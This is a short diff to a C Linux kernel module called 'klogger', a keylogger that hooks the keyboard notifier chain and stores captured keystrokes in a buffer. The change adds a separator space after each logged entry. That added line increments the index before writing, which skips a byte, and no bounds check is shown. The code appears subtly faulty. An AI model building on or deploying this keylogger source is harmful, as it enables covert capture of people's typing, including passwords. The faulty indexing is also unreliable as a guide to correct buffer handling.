@@ -95,6 +95,7 @@ int log_kbd(struct notifier_block *nb, unsigned long icode, void *param)
 
 	strncpy(buf_keys + buf_pos, logbuf, len);
 	buf_pos += len;
+	buf_keys[++buf_pos] = ' ';
 
 	return NOTIFY_OK;
 }
@@ -119,6 +120,7 @@ static int __init klogger_init(void)
 	}
 
 	register_keyboard_notifier(&klogger_blk);
+
 	return 0;
 }
 
